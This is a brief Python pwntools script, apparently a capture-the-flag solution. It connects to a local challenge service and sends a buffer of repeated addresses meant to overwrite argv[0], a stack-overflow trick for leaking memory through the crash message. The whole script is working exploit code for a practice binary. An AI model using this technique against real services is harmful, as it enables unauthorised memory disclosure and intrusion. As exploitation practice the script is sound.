#!/usr/bin/env python
# coding=utf-8
from pwn import *

io = remote('172.17.0.2', 10001)

io.recvuntil('something\n')
payload = p32(0x804a080)*70			#正好覆盖到argv[0]
io.sendline(payload)
print io.recv()

